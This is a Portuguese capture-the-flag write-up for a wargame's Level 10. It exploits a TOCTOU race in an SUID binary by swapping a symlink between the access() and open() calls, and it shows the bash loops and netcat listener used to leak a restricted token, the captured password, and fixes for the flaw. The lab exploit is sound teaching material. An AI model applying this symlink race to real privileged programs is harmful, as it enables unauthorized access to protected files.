# 𝕃𝕖𝕧𝕖𝕝 𝟙𝟘

## 🎯 Objetivo
O objetivo deste nível é explorar uma vulnerabilidade de Condição de Corrida (*Race Condition*), burlando a checagem de permissões do sistema para exfiltrar a senha através de uma conexão de rede local.

## 🔍 Análise da Vulnerabilidade

* **Tipo:** *Race Condition* / *TOCTOU* (Time-of-Check to Time-of-Use).
* **Arquivo Alvo:** `level10` (Executável SUID) e `token` (Arquivo de texto restrito).
* **Comportamento:** Através da engenharia reversa do binário, observamos que o programa executa três ações principais em sequência:

    1. Verifica se o usuário real tem permissão de leitura no arquivo passado via argumento, usando a função `access()`.
    2. Inicia uma conexão de rede (Socket) para o IP fornecido e envia um banner `.*( )*.`. (Isso gera um atraso na execução).
    3. Abre o arquivo com `open()` usando os privilégios SUID, lê o conteúdo e o envia pela rede.

    A vulnerabilidade reside na janela de tempo entre a verificação (`access`) e o uso (`open`). Se conseguirmos criar um arquivo falso que passe na checagem do `access`, e trocá-lo rapidamente por um link simbólico apontando para o token antes do `open` ser executado, o programa exfiltrará o arquivo restrito.

## 💻 Passos para Exploração (Exploit)

1.  **Reconhecimento:**
    Listamos os arquivos e identificamos o executável SUID `level10` e o arquivo alvo `token`. Transferimos o binário via `scp` para análise local de código no descompilador.
     ```bash
    scp -P 4242 level10@192.168.56.101:level10 bin_level10
    ```

2.  **Engenharia Reversa:**
    Ao analisar o código em C no descompilador, confirmamos a falha estrutural: a distância temporal e as operações de rede executadas entre o `access()` e o `open()` criam a brecha ideal para a condição de corrida.
    ```bash
    scp -P 4242 level10@192.168.56.101:level10 bin_level10
    Decompiler!
    # Saída:
    # ...
    # iVar2 = access((char *)param_2[1],4);
    # ...
    # printf("Connecting to %s:6969 .. ",__cp);
    # ...
    # iVar3 = connect(iVar2,&local_24,0x10);
    # ...
    # sVar4 = write(iVar2,".*( )*.\n",8);
    # ...
    # __n = read(iVar3,local_1024,0x1000);
    # ...
    ```

3.  **Preparação e Escuta (Terminal 1):**
    Abrimos uma porta local (6969) no modo de escuta contínua com o Netcat, mantendo a conexão aberta para receber os dados exfiltrados repetidas vezes.
    ```bash
    nc -lk 127.0.0.1 6969
    # Saída:
    # ...
    # .*( )*.
    # .*( )*.
    # woupa2yuojeeaaed06riuj63c
    # .*( )*.
    # ...
    ```

4.  **Exploração - O Trocador / Swapper (Terminal 2):**
    Criamos um arquivo falso com permissões abertas (`/tmp/fake`) e, em seguida, executamos um loop infinito no Bash para alternar agressivamente o alvo de um link simbólico (`/tmp/swap`) entre o arquivo falso e o arquivo de senha.
    ```bash
    touch /tmp/fake
    while true; do ln -fs /tmp/fake /tmp/swap; ln -fs /home/user/level10/token /tmp/swap; done
    ```

5.  **Exploração - O Atacante (Terminal 3):**
    Executamos o binário vulnerável em outro loop infinito apontando para o nosso link simbólico e para o nosso localhost.
    ```bash
    while true; do ./level10 /tmp/swap 127.0.0.1; done
    ```
    Após poucos segundos da execução paralela, o alinhamento de processos ocorreu: o `access` validou a permissão no `/tmp/fake`, a troca do link aconteceu durante o tempo de handshake da rede, e o `open` foi redirecionado para ler o conteúdo do `token`.

## 🚩 Solução / Flag
O ataque de *Race Condition* obteve sucesso. O *listener* (Netcat) no Terminal 1 começou a imprimir a flag capturada em texto claro, misturada com os banners da aplicação:
```bash
su flag10
# Inserir a senha decifrada: `woupa2yuojeeaaed06riuj63c`
getflag
```

Senha para o próximo nível: `woupa2yuojeeaaed06riuj63c`

## 🛡️ Prevenção (Como corrigir)
1. **Evitar TOCTOU**: Nunca baseie decisões de segurança em checagens (`access`, `stat`) separadas da operação real de abertura do arquivo (`open`). O estado do sistema de arquivos pode ser manipulado por outros processos de forma concorrente.

2. **Abrir primeiro, checar depois (File Descriptors)**: A abordagem correta é usar a função `open()` diretamente para obter um *File Descriptor* (descritor de arquivo). Em seguida, usa-se `fstat()` diretamente neste descritor (e não no caminho do arquivo) para verificar suas propriedades. Como o arquivo já está aberto na memória, ele não pode ser trocado por um *symlink*.

3. **Queda temporária de privilégios**: Se um programa SUID precisa ler um arquivo em nome do usuário comum que o chamou, ele deve usar `seteuid()` para adotar temporariamente o UID não-privilegiado antes de tentar o `open()`. Desta forma, o próprio kernel do sistema operacional garantirá o bloqueio de acessos indevidos de forma atômica.
